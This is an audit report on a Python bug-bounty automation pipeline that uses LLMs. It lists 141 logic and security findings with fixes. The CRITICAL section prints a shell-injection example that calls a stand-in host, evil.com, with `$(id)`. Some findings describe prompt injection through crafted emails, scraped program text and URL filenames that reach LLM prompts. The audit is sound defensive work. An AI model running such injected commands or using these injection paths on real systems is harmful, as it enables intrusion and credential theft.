> **HISTORICAL (2026-10-10) — audit snapshot; findings since dispositioned in code.** Kept as audit history, not current state.

# Oracle Pipeline — Logic Audit

**Date:** 2026-09-28
**Scope:** `~/workspace/oracle` (~10,166 lines Python), 9 modules audited in parallel, read-only. No commits.
**Method:** each module read end-to-end; line numbers grep-verified; cross-module claims checked at call sites. Logic issues only — no style, no docs.

## Counts

| Severity | Count |
|---|---|
| Critical | 9 |
| High | 33 |
| Medium | 57 |
| Low | 42 |
| **Total** | **141** |

## Top 5 (fix these first)

1. **`oracle_hunter.py:1155-1166`** (CRITICAL) — `_run_check` executes LLM-parsed `check` strings with `shell=True`; model-emitted metacharacters (`;`, `$()`, `&&`) execute arbitrary commands on the researcher's box. Fix: reject shell metacharacters or run via shlex-split argv with `shell=False`.
2. **`oracle_auth_session.py:285-331`** (CRITICAL) — `build_idor_probes` scrapes URLs from LLM-written assertion text with zero host/scope validation, then attaches live Account B credentials. Creds fire at hallucinated or third-party domains. Fix: require parsed host ∈ in-scope assets before building any probe.
3. **`oracle_programs.py:1741-1752`** (CRITICAL) — a fully-failed scrape returns `[]` and is cached unconditionally as a complete result; the next 24h of runs serve the poisoned empty cache. Fix: only cache non-empty results; track per-platform completeness.
4. **`oracle_programs.py:1763-1801`** (CRITICAL) — structured scope is fetched **only for HackerOne**; every other platform's saved program has no `scope`/`structured_scopes`, so `ProgramScopeGate` downstream validates against nothing. Fix: fetch scope for all platforms or refuse to save scopeless programs.
5. **`oracle_auth_session.py:259-282` + `oracle_hunter.py:1221,1420`** (CRITICAL/HIGH) — live `Authorization`/`Cookie` values are interpolated into `curl` check strings that are printed to the terminal, stored in seam cards, and sent to cloud LLM APIs in triage/PoC prompts. Fix: redact auth headers before any display, storage, or model call; inject secrets only at execution time.

## Verification of the 3 known issues

1. **Repo auto-clone gap — CONFIRMED, with nuance.** `ProgramWorkspace.download_assets` (`oracle_mindset_context.py:518-581`) contains zero clone logic: a `github.com` URL passes the URL filter, gets fetched as HTML, saved as `.txt`. The skip lands at `oracle_hunter.py:2130-2142` — one `_info` line, pipeline continues recon-only, and the final report never records that Type-1 was skipped. Nuance: `oracle_scan.py:266-275` *does* have a clone step in its separate intake path, but it only uses `repo_url`/scope idents — never the fetched program-page HTML (the Aave V4 case). Siblings: 20-URL cap truncation (`oracle_scan.py:329`, `oracle_mindset_context.py:527`), filename collisions (`oracle_scan.py:331`), unsanitized `repo_name` in clone path (`oracle_scan.py:266-269`).
2. **Hardcoded Invisible Seam paths — CONFIRMED, worse than reported.** `oracle_code_seam.py:23-27` lists three candidates, all under `/home/phantomcore/`; the docstring's claimed `~/invisible-seam` location is not in the candidate list. The failure is caught (warn + continue), but the consequence is a false clean bill (see HIGH-25). Siblings: `CHROMIUM_USER_DATA`/`/snap/bin/chromium` (`oracle_programs.py`), `GO_BIN=/home/phantomcore/go/bin`, `localhost:11434`, CDP `9227` (`oracle_hunter.py`), Firefox/voice paths (`oracle_email.py`), and `tests/test_code_seam.py` hardcoding `/home/phantomcore/invisible-seam/demo_repo`.
3. **Payout-dominated ranking — CONFIRMED, with two sibling burying paths.** `_program_score` (`oracle_programs.py:1628-1649`) = `payout / sqrt(reports+1) × 1.5 × 1.3`. Only HackerOne populates `reports_count` (everyone else gets denominator 1 — the penalty applies asymmetrically), six web3 scrapers hardcode `fast_triage: True` (free 1.5×), and Immunefi parses `$2.5M` → 2,500,000. Sibling 1: `_scrape_generic_platform` sets `max_payout_usd: 0` → score 0 → pinned to bottom. Sibling 2: `fast_triage = "Cantina-Triaged" in text or True` (`:1184`) is dead code — always `True`. Result: top-50 is all web3 and ~180 web2 programs mathematically cannot surface.

---

## CRITICAL (9)

- **`oracle_hunter.py:1155-1166`** — `_run_check` runs the seam `check` with `shell=True`; the string is LLM-parsed output (`_parse_seams`), and `validate_check` only enforces scope, never strips metacharacters. `curl -i -s https://t/x; curl evil.com/$(id)` executes. Fix: reject `;|&$`()` outside quotes, or shlex-split with `shell=False`.
- **`oracle_auth_session.py:285-331`** — `build_idor_probes` regex-scrapes URLs from seam corpus including LLM-written assertion text, no host/scope/recon verification, then embeds Account B's live token/cookies. Fix: parse host, require ∈ in-scope assets, source URLs only from recon-verified fields.
- **`oracle_auth_session.py:259-282`** — `build_curl_probe` interpolates live token + cookies into a `curl` string stored verbatim in the seam `"check"` field, which verify/PoC/report consume. Fix: credential placeholders in stored strings; inject secrets only at execution.
- **`oracle_programs.py:1741-1752`** — empty/failed scrape cached as complete; 24h of poisoned cache. Also `oracle_scan.py:109` (same bug, second call site). Fix: cache only non-empty; per-platform completeness flag.
- **`oracle_programs.py:1750-1752`** — `--platform X --refresh` overwrites the shared cache with one platform's data, permanently deleting the rest until next full refresh. Fix: merge per-platform or skip caching on filtered refresh.
- **`oracle_programs.py:1920-1921`** — `_die()` only prints, never exits; `cmd_save:1816-1823` and `cmd_platforms:1926` crash on `None` / missing file immediately after. Fix: `sys.exit(1)` in `_die`.
- **`oracle_programs.py:1604-1624`** — `_load_cache` has no try/except (corrupt cache = hard crash of every run); `_save_cache` writes non-atomically, so a killed process mid-write *creates* the corruption. Also `oracle_scan.py:102`. Fix: try/except → cache miss; write tmp + `os.replace`.
- **`oracle_programs.py:1763-1801`** — scope fetched only for HackerOne; all other platforms save programs with no scope keys; scope-fetch failure on H1 only warns and saves anyway. Scope wall validates against nothing. Fix: fetch scope for all platforms; fail loudly instead of saving scopeless.
- **`oracle.py` (whole file)** — the supposed entry module defines no `hunt`/`scan`/`pick`/`verify` subcommands and imports nothing from `oracle_hunter`; the real entry is `oracle_hunter.py:2357`. Anyone pointed at `oracle.py` cannot run the pipeline. Fix: add dispatching subcommands or formally designate `oracle_hunter.py` as the entry.

---
## HIGH (33)

**Credential handling**
- **`oracle_hunter.py:1315-1317,1337,1344`** — `--auth`/`--cookie` tokens injected into the check string, then the full string (with `Authorization: Bearer <secret>`) printed via the `input()` prompt and `_info(f"Running: {check[:100]}")`. Fix: redact `Authorization:`/`Cookie:` before any display.
- **`oracle_hunter.py:1221,1420`** — same auth-bearing `check_cmd` interpolated into the triage prompt (sent to cloud LLM backends) and the PoC prompt (`_cloud_escalate` → Anthropic/Gemini). Researcher tokens exfiltrated to third-party APIs. Fix: strip auth headers before any model call.
- **`oracle_auth_session.py:15,178,186`** — `prompt_credentials` reads secrets with echoing `input()` despite `getpass` being imported. Fix: `getpass.getpass()`.
- **`oracle_auth_session.py:203-226`** — `save_session` writes live tokens/cookies to plaintext `sessions.json` in the workspace with default umask. Fix: mode `0o600` + warning, or stop persisting secrets.
- **`oracle_auth_session.py:259-282`** — no scheme/host validation before attaching auth; `http://` URLs or wrong domains still get credentials. Fix: require HTTPS and in-scope host.
- **`oracle_auth_session.py:161-191`** — both accounts skippable via Enter with zero warning; credential-less probes still carry compliance framing, so verify treats them as authenticated. Fix: `has_credentials()` + loud warning / require explicit `--anonymous`.

**Cloud / cost / backend control**
- **`oracle_hunter.py:2250`** — `--no-cloud` does not prevent cloud calls: `cloud=None` and `False` both fall into `_cloud_escalate`, which tries `ANTHROPIC_API_KEY`/`GEMINI_API_KEY` then the router. Findings leave the box after explicit opt-out. Fix: tri-state resolve (`None`=auto, `False`=local-only) and thread the flag through.
- **`oracle_llm.py:203`** — Ollama backend passes `timeout=None` straight to `requests.post` = hang forever on a stalled server; other backends default their timeouts. Fix: `timeout=timeout or 300`.
- **`oracle_llm.py:82-115`** — model-discovery cache stores only `{ts, models}`; flipping `allow_paid` True→False serves stale paid model IDs for up to 3600s and bills them. Fix: include `allow_paid` in the cache key.
- **`oracle_llm.py:155-159`** — no `max_tokens` on OpenRouter payload; a verbose/looping model + per-model retry = open-ended charge. Fix: add task-dependent `max_tokens`.
- **`oracle_llm.py:163`** — `finish_reason` unchecked; truncated (`"length"`) or filtered responses flow into verify/PoC/report as complete findings. Fix: raise `BackendError` unless `finish_reason == "stop"`.
- **`oracle_llm.py:243`** — recursion guard tests the config *key* (`self.name`), not the binary: `{"myhelper": "claude -p"}` bypasses and self-spawns inside its own session. Fix: check `Path(shlex.split(self.invoke)[0]).name`.

**Verification / confirmation integrity**
- **`oracle_hunter.py:1188`** — deterministic auto-CONFIRM on substring `"password"`/`"secret"` in the response plus check mentioning `debug`/`config`/`env`/`.git` — any login page or JS bundle auto-confirms a bogus finding into PoC/report. Fix: require structured proof (e.g. `AKIA…` regex, `BEGIN PRIVATE KEY`).
- **`oracle_code_seam.py:154-160`** — non-`FIXABLE` seams (e.g. `PARADOX`) keep their classifier verdict (`CERTAIN`, `check=None`) and pass the `in ("RESOLVED","CERTAIN")` auto-confirm gate at `oracle_hunter.py:2220` — the "deterministic checks" justification for skipping verify doesn't hold where no check ran. Fix: downgrade to `"UNVERIFIED"` unless an executed check produced the verdict.
- **`oracle_code_seam.py:192`** → crash at `oracle_hunter.py:2160` — `"check": seam.check` is `None` for non-FIXABLE seams; the RICH table does `s['check'][:45]` → `TypeError`, killing the hunt post-analysis. Guaranteed whenever the engine runs. Fix: `"check": seam.check or ""`.
- **`oracle_code_seam.py:116-120`** — `invisible_seam` unavailable → stderr-only print, `return []`; `oracle.py:486-488` prints *"No seams found. All code contracts and specifications match reality."* — a clean bill of health when the engine never ran. In `cmd_hunt` it's masked by `_ok("code lens: 0 Type-1 seam(s)")`. Fix: raise/sentinel `EngineUnavailable`; surface "Type-1 engine did not run".
- **`oracle_mindset_context.py:325-342`** — `chain_seams` docstring promises "only CONFIRMED seams compose" but the body never checks any verdict flag; any caller beyond the current pre-filtered one chains unconfirmed seams. Fix: filter on verdict/`confirmed` inside the function.

**Scope wall**
- **`oracle_scan.py:585-591`** — `save_program_brief` writes the brief even when scope/structured_scopes/targets are all empty; `_program_brief` just omits the section silently. Empty wall = fail-open downstream. Fix: abort/warn intake on empty in-scope list.
- **`oracle_mindset_context.py:600-615`** — `_fetch_asset` grabs the first `"type": "page"` CDP tab — the user's live authenticated Chrome — and `Page.navigate`s it to scope-derived URLs: session-riding/CSRF surface plus destroying the user's open page. Sibling: `oracle_scan.py:195` (`_screenshot` does the same). Fix: `Target.createTarget` / `PUT /json/new` instead of reusing the page tab.
- **`oracle_mindset_context.py:518-540`** — no repo-URL extraction or `git clone` in `download_assets`; Type-1 lens silently never runs for web3 (see verification §1). Fix: detect `github.com/<org>/<repo>` (+ git hosts) and clone during intake.
- **`oracle_scan.py:494`** — `display_assets_report` prints "✓ READY" unconditionally; all fetch failures swallowed (`except: pass` at :341, silent `git clone` via `check=False` at :275). Total network failure still reports success. Fix: readiness from `count > 0`.

**Program data / ranking**
- **`oracle_programs.py:1582-1598`** — `fetch_all_programs` swallows per-platform exceptions; caller can't distinguish partial from complete; combined with the cache bug, a 12-of-13 outage caches a 1-platform world. Fix: return per-platform status; don't cache partial over complete.
- **`oracle_programs.py:1083`** — YesWeHack fetches page 1 only (`resultsPerPage=100`), no pagination loop; everything past 100 silently dropped. Sibling: `_scrape_generic_platform` single-pass shape. Fix: loop until empty/short page.
- **`oracle_programs.py:1184`** — `fast_triage = "Cantina-Triaged" in text or True` is unconditionally `True` (dead check, free 1.5× multiplier). Fix: drop `or True`.
- **`oracle_programs.py:1628-1649`** — payout-dominated scoring buries web2 (see verification §3). Fix: per-kind normalization or log/percentile scaling; fix `reports_count` asymmetry and hardcoded triage flags.

**CLI**
- **`oracle.py:481`** — `if args.repo or args.mode == 'audit'` fires before all other branches; `--repo X --ask "Q"` silently runs audit and drops `--ask`. Fix: error on incompatible flag combos.
- **`oracle.py:482`** — `--input` double-purposed: spec-audit expects content, audit mode treats it as a repo path. Fix: require `--repo` for audit; reject `--input` + `--mode audit`.
- **`oracle.py:65-84,468-479`** — `query_local_model` returns `"[ollama error]…"` as a normal string; `main()` prints it and exits 0. Backend failure looks like success to scripts. Fix: detect the `[...]` prefix, `sys.exit(1)`.

**Email module (standalone; orphaned from pipeline — see note below)**
- **`oracle_email.py:1055-1059`** — `_ollama` returns `""` on any exception while `reply=True` is the default: LLM outage → every email auto-drafted. Fix: default `reply=False`; bail on empty output.
- **`oracle_email.py:1095,1108`** — returns `"[ollama unavailable — draft manually]"` placeholder that can be queued/approved/sent to a real human. Fix: raise instead.
- **`oracle_email.py:1659-1679`** — `cmd_reply` passes the Gmail thread ID as the `to` address and `Re: {msg_id}` as subject. Fix: parse the thread's sender address and real subject.
- **`oracle_email.py:760`** — docstring promises ≤1 SMS per 60s; the daemon has no throttle. Fix: implement last-sent timestamp check.

---
## MEDIUM (57)

**oracle_hunter.py**
- `:2130-2142` — Type-1 skip: one `_info` line, report never records it. Fix: loud warning + record skip in report.
- `:1584-1595` — `_parse_seams` invents checks: `url_m` turns any URL in prose into a check, `path_m` turns `/token`-like strings into `curl {target_base}/path` — violating HARD RULE 1. Fix: drop fallbacks; discard cards with no explicit check.
- `:607` — scope-gate fail-open for active scanning: if the gate filters all live hosts, `clean_urls` is silently repopulated with the raw target for katana/nuclei. Fix: abort or require explicit override.
- `:545-640` — silent tool skips in `recon()`: missing subfinder writes a *synthetic* domain, dnsx/gau/katana/hakrawler silent (only httpx/nuclei warn); LLM reasons over fabricated recon as real. Fix: `_warn` every skipped tool.
- `:203-212` — `_scope_from_programs` substring-matches program names; hunting `"pay"` can attach the wrong program's scope. Fix: exact-slug match first, disambiguate.
- `:2205-2212` — code-lens seams auto-confirm with no `validate_check`; checks/URLs from code comments flow to PoC/report unfiltered. Fix: run code-seam checks through the scope gate.
- `:440-490` — `validate_check` downgrades POST/PUT/DELETE→GET (data stripped) with only `_info`; verify may CONFIRM from a GET that never exercised the mutation. Fix: mark downgraded checks non-confirming.
- `:51,~678,~1002,2033` — hardcoded `GO_BIN`, mitre heatmap path, `localhost:11434`, CDP `9227`. Fix: env-overridable config.

**oracle_programs.py**
- `:1707,1728` — silent filter no-ops: `out = fresh or out` discards `--new-programs-only` / `--recently-added-assets` when they match nothing. Fix: return empty or warn.
- `:352` — cookie domain matcher `cd.endswith("." + req_host.lstrip("."))` attaches `evilbugcrowd.com` cookies to `bugcrowd.com` requests. Fix: keep only exact + proper-subdomain matches.
- `:1069` — Bugcrowd `fast_triage` substring-matches `"Managed"` in program names → false 1.5×. Fix: use only `managed_services`/`serviceLevel` fields.
- `:1404,1415` — payout parsing: no `K/k` handling (`$500K` → `$500`); CodeHawks hardcodes ETH=$3000. Fix: K/k multiplier; drop hardcoded conversion.
- `:1126,1131` — no cross-platform dedup (H1+Bugcrowd double-list); `.title()` slug→name mangling breaks round-trip. Fix: dedupe on normalized (platform, url); keep original slug.
- `:cache→prompts` — program names/card text/`raw` payloads cached verbatim and flow into LLM reflex prompts; attacker-controlled on several platforms. Fix: sanitize at ingestion or delimit with provenance.
- `:module-wide` — hardcoded `/home/phantomcore` Chromium profile, `/snap/bin/chromium`, CDP 9227 → CDP scrapes silently return `None` off-box (fail-open). Fix: env overrides + loud error.

**oracle_mindset_context.py**
- `:527,542-581` — `urls[:20]` cap drops assets silently; 21 probe URLs crowd out real scope assets. Fix: dedup, prioritize, log drops.
- `:529-535` — `len(content) > 100` drops valid small files; `out.exists()` reports stale files as "saved"; `content[:500_000]` truncates silently. Fix: per-URL status instead of bare filenames.
- `:617-624` — requests fallback returns `r.text` for any 2xx: WAF blocks, login walls, "Access Denied" pages saved as real assets and fed to LLM stages. Fix: reject on block markers / content-type mismatch.
- `:617-624` — SSRF-ish: `allow_redirects=True`, no scheme/host validation on program-derived URLs (link-local reachable from VM). Fix: validate scheme, blocklist private ranges.
- `:320` — `classify_seam` returns TYPE_1 on ties *and* on zero signals (`t1>=t2`); `"paradox"` is itself a TYPE_1 keyword, biasing reflex output. Fix: default ties/zero-signal to TYPE_2 or `"UNKNOWN"`; require a margin.
- `:428-442` — `_parse_severity` defaults unknown→2 (medium), then chains bump to high; substring matching mis-scores "non-critical", "prevent account takeover". Fix: word boundaries, negation handling, default 1 or 0.
- `:175` — `GOOGLE_PLAY_APP_ID`/`APPLE_STORE_APP_ID` hit `continue`: mobile scopes vanish from both in-scope and out-of-scope lists. Fix: list them as in-scope.
- `:237` — `f"...${payout:,}"` crashes on string/`None` payout. Fix: numeric guard + coerce.
- `:171-172,554-556` — `None` scope fields: `.get("structured_scopes", [])` → `None` → `TypeError`; `None.strip()` → `AttributeError`. Fix: `or []` / `or ""` guards.
- `:150-157` — malformed TTP records raise `KeyError` (only `JSONDecodeError`/`OSError` caught), killing prompt build. Fix: `.get()` with skips.
- `:560-565` — bare-domain scope entries (`app.example.com`, no scheme; case-sensitive `HTTP://`) never fetched though listed in-scope. Fix: normalize to `https://`.
- `:247-252` — crafted scope URL paths land verbatim in the system prompt's asset list (prompt injection via filenames). Fix: sanitize/hash filenames or list count+size only.

**oracle_scan.py / oracle_bounty.py**
- `:329` — `urls_to_fetch[:20]` truncates worst-first: recon paths (robots/openapi) appended last are dropped first. Fix: fetch recon paths first or log skips.
- `:331` — 60-char filename truncation collides; second URL skipped as "exists" but counted as saved. Fix: append `md5[:8]`.
- `:266-269,275` — `repo_name` from program data unsanitized (`..` → parent dir, leading-dash git option injection); `check=False` silences real clone failures. Fix: sanitize, reject `..`, `--` before URL, check returncode.
- `:165,396,593,640` — `p["platform"]`/`p["name"]` direct indexing `KeyError` on incomplete cache entries. Fix: `.get(..., "?")`.
- `:252` — non-dict `structured_scopes` entry → `AttributeError` on `.get`. Fix: `isinstance` guard.
- `:406` (bounty) — unguarded `json.loads` on MANIFEST.json. Fix: try/except → `{}`.
- `:(intake)` — repo clone candidates never include links extracted from fetched `program_page.txt` HTML (the Aave V4 gap). Fix: extract git-host links from program page too.

**oracle.py**
- `:468-479` — silent action-flag precedence (`--output-system-prompt` > `--feed` > `--ask`); `--feed DIR --ask "Q"` drops the question. Fix: warn/exit non-zero on multiple action flags.
- `:353` — `if full is not ORACLE_FRAMEWORK:` identity check; empty prompt file → empty system prompt piped to LLM silently. Fix: `if full.strip():`.
- `:481-489` — no `.env`/API-key validation at startup; missing keys fail deep in pipeline stages. Fix: validate required config before dispatch.
- `:491,378-440` — bare `input()` in `run_interactive` raises unhandled `EOFError` on Ctrl-D/non-tty. Fix: catch `EOFError`/`KeyboardInterrupt`, exit cleanly.

**oracle_auth_session.py**
- `:180,188` — token heuristic: only `bearer `/`ey` prefixes treated as tokens; opaque tokens (e.g. `abc123`) silently dropped into cookie parsing → lost. Fix: fall back to bearer when cookie parse yields nothing.
- `:341-349` — `evaluate_cross_account_idor` builds credentialed requests from arbitrary templates, no scope validation (sibling of CRITICAL-2). Fix: validate resolved host/scheme.
- `:259,265` — `build_curl_probe(as_account="b")` defaults to the attacker account, contradicting "A is primary verify auth". Fix: default `"a"` or require explicitly.
- `:280` — `json.dumps(data)` on an already-string body → malformed POST probes. Fix: only dump dicts.

**oracle_llm.py**
- `:219,238-247` — `copilot` ships in default config/routes but is excluded from `_CLI_BLOCKED_IN_SESSION` on an unverified "safe" claim; no Copilot-session detection. Fix: block it + detect its session env.
- `:274-279` — `build_backends_for` instantiates any configured CLI name, but the guard knows only three hardcoded names (`codex` etc. unguarded). Fix: in agent sessions, allowlist known-safe CLIs only.

**oracle_code_seam.py**
- `:23-27` — hardcoded `/home/phantomcore/...` candidates (see verification §2). Fix: add `Path.home()/"invisible-seam"` (+`/src`), env override.
- `:154-157` — one failing `write_check`/`run_check` propagates and discards *all* code seams (including already-classified PARADOX). Fix: per-candidate try/except, continue.
- `:129-138` — no file/depth caps, no timeouts; monorepo stalls the synchronous hunt. Fix: `max_files`/depth caps + timeouts.
- `:66,95` — substring reflex/CWE mapping (`"return" in text`, `"admin"`, `"token"`) fires on near-any doc text; impact narratives assert unevidenced specifics. Fix: word boundaries; derive narrative from structured fields.
- `:157` — `UNSOLVED` FIXABLE seams kept and presented as vulnerabilities (auto-confirm gate saves them from PoC, but readers see findings). Fix: drop or mark unproven.

**oracle_email.py** (standalone tool; orphaned from pipeline)
- `:1206` — voice gate fails open (`pass=True` "verifier unavailable — queuing anyway"). Fix: `pass=False` + explicit override.
- `:1035-1048,1099-1107,947-962` — email from/subject/body interpolated unsanitized into LLM prompts; brittle `"YES" in l` parsing; crafted mail can trigger SMS + auto-draft. Fix: delimiters + ignore-instructions preamble; strict `KEY: value` parsing.
- `:1547-1561` — daemon hits interactive `input()` via `queue_draft`→`validate_email_address`→`_confirm` (hang/EOFError in background). Fix: `non_interactive=True` in daemon context.
- `:119,225-228` — `_sync_cdp_profile` copies `logins.json`+`key4.db`+`cookies.sqlite` out of the live Firefox profile. Fix: don't copy credential stores.
- `:1231-1238` — queue read-modify-write with no lock; `cmd_approve` can double-send. Fix: `fcntl.flock`.
- `:1233` — corrupt `email_queue.json` crashes every command. Fix: catch `JSONDecodeError`, back up, start empty.
- `:940` — `status None` treated as "domain unreachable" → silent skip of reply-worthy mail. Fix: content-present + status-None = unknown.
- `:1506` — docstring claims SMS on `oracle_bounty` CONFIRMED findings; no such integration exists. Fix: implement or correct.
- `:255` — `--remote-allow-origins=*` lets any local origin drive the authenticated Firefox via CDP. Fix: restrict to localhost.

---
## LOW (42)

**oracle_hunter.py** — `:2475` glob built from raw user input (`*{d.name}*.md`; `*?[` alter matching); fix: iterate + `in` compare. `:1680-1710` `_write_report` publishes unconfirmed seams + raw model output verbatim (model markdown injects into report); fix: "Unverified candidates" section, fence output. `:246-266` TLD allowlist in `_extract_domains` drops newer TLDs (`.security`, `.finance`); fix: accept plausible TLDs or configure.

**oracle_programs.py** — `:1735-1737` `filter_programs` mutates cached dicts (`p["score"]` persists into cache file); fix: copy or strip before save. `:1685-1688` `--web2 --web3` together silently disables both kind filters; fix: error or document. `:401-419` `_get_csrf_from_page` opens a CDP tab via `/json/new`, never closes it on exception → tab leak; fix: `finally`. `:143` `_load_env` re-parses `.env` on every `_key()` call (hot paths); fix: cache once.

**oracle_mindset_context.py** — `:571` `list(domains)[:3]` on a set → non-deterministic probing; fix: `sorted()`. `:566` domain regex misfires on `user:pass@host` (extracts `user`) and drops IPv6 literals; fix: `urllib.parse` hostname. `:542-581` no URL dedup burns cap slots; fix: order-preserving dedup. `:399` chain severity emits `"Critical"` vs lowercase `SEVERITY_RANK` (future `KeyError`); fix: lowercase. `:385` "pairs and triples" comment, pairs-only code; fix: implement or correct comment. `:634-639` `_url_to_filename` extension heuristic misfires (`.js` in path, `?format=json`); fix: decide from path suffix. `:631` 120-char truncation collides → second URL skipped as "exists"; fix: append URL hash. `:510-515` `save_report` label unsanitized (`/` traverses); fix: slug-sanitize. `:467` `ProgramWorkspace.__init__` crashes on `None` name; two programs with same slug silently share a workspace; fix: `str()` guard + collision suffix. `:148,:247` silent TTP/local-asset truncation; fix: log counts.

**oracle_scan.py / oracle_bounty.py** — `:569` `filter.pick_per_platform` read then ignored (drops to interactive prompt); fix: honor or remove. `:471,563` reversed ranges (`5-3` → `[]`) silently select nothing; fix: swap or warn. `:315` only 4 domains get recon paths, silently; fix: log. `:220,427` bare `except` in `_screenshot`/seam import hides real errors (incl. unbounded `while True` in `_send`); fix: catch `Exception as e`, debug-log. `_p()` interpolates program text into rich markup (`[` → `MarkupError` mid-run); fix: escape or `markup=False`. `oracle_bounty.py:56-57` import-time `mkdir` on `--help`; fix: move into `main()`. `:159-164` `sanitize_target` strips only lowercase scheme (`HTTP://EXAMPLE.COM` → domain `"HTTP:"`); fix: case-insensitive + validate. `:98` `"platforms": []` silently means "all"; fix: `None` check instead of `or`.

**oracle.py** — `:481` `--repo` on nonexistent path → bare `FileNotFoundError` traceback; fix: pre-validate in `main()`.

**oracle_auth_session.py** — `:228-242` `load_session` bare `except: return False` masks corrupt JSON → half-loaded harness looks like "no session"; fix: log or raise. `:46-56` secrets as plain dataclass fields, default `repr` prints them in tracebacks, no wipe; fix: `repr=False`, zero after use.

**oracle_code_seam.py** — `:157-159` silent `CLOSED` dismissals (can't distinguish "clean" from "N dismissed"); fix: log count. `:122` `scan_repository_seams("")` resolves to cwd and scans the wrong tree; fix: `ValueError` on falsy path. `:150` fragile `type(seam)(**seam.__dict__)` reconstruction + drops upstream IDs; fix: keep original object, store canonical id in output dict. `:165-169` `raw_card` trusts `source_a`/`source_b` are `Path`; fix: build from stringified dict values.

**oracle_email.py** — `:464,:568` unparseable threads silently skipped (`except: pass`); fix: count + report. `:1573` daemon dedup resets on failed read (missed notifications; double-SMS with two daemons); fix: update `last_ids` only on success, persist to disk. `:73` `_find_home` falls back to `parents[1]` guess; fix: raise clear error. `:104,144,151-155,777,760,1540` hardcoded Alex's-machine paths (Desktop voice file, Firefox profile, `localhost:11434`, tmomail, `notify-send`); fix: env overrides. `:~1160` `validate_email_address` claims MX check, does A-record only; fix: real MX or fix docstring. `:1010-1019` `_SKIP_SENDERS` substring-matches `support@hackerone.com`; fix: exact local-part+domain pairs. `:~600-628` `ws.close()` only on success path → CDP socket leak; fix: `try/finally`. `:~385` `_ws_eval` unbounded `while True` recv; fix: timeout/iteration bound.

## Cross-cutting themes

1. **Silent skips are the dominant defect class** (~25 findings): engine-not-run looks clean, failed scrapes cache as complete, tools missing without warning, filters silently discarded, accounts skippable without warning. The pipeline consistently prefers looking successful over being honest. Highest-leverage cultural fix: every skip/warning should be loud and recorded in the report.
2. **Fail-open defaults**: empty scope wall, `--no-cloud` ignored, voice/triage gates failing open, unauthenticated probes framed as authenticated. Security tooling must fail closed.
3. **The CDP tab pattern is a repeated hazard** (`oracle_mindset_context.py:600-615`, `oracle_scan.py:195`): grabbing the first `"type": "page"` tab navigates the user's real authenticated browser. Always `Target.createTarget`.
4. **Credentials flow toward output**: tokens into terminal prompts, seam-card check strings, cloud LLM prompts, plaintext session files, dataclass reprs. Rule: secrets exist only in memory at execution time, never in strings that get stored, displayed, or transmitted.
5. **`/home/phantomcore` is load-bearing in at least 6 places** across 5 modules plus tests — the codebase is not installable/portable as-is.
6. **The scope wall has 4 independent holes**: no scope data for non-H1 platforms, no intake validation of empty scope, code-lens seams bypass the gate, active-scan fallback re-adds the raw target. Any one of them lets out-of-scope work through.

## Appendix — module notes

- `oracle_email.py` is **orphaned from the hunt pipeline** (zero imports repo-wide; standalone `oracle-email` CLI). Its findings apply to that tool. Its `cmd_recon` runs an 8-reflex analysis that never touches `ProgramScopeGate` — if ever wired into `cmd_hunt`, gate it first.
- `oracle.py` is **not the pipeline entry point** despite the name; `oracle_hunter.py:2357` (`hunt` → `cmd_hunt`) is. The two CLIs have overlapping flags and divergent behavior.
- `oracle_llm.py` is genuinely fail-closed (all backends raise; no placeholder path) — its issues are cost control, timeouts, and guard bypasses, not fabrication.
- `ProgramScopeGate` lives in `oracle_hunter.py:264`, not `oracle_mindset_context.py` as the architecture doc implies — the mindset module's only wall is prompt text.
- No shell-injection path was found in `oracle_programs.py` (list-form subprocess); the RCE is specific to `oracle_hunter.py:_run_check`.
- Checked and cleared: `_fetch_asset` CDP `ws.recv()` loop (socket timeout → fallback); `_url_to_filename` traversal (neutralized); `example.com` rewrite guard; `field(default_factory=dict)`; A/B role consistency in IDOR probes.
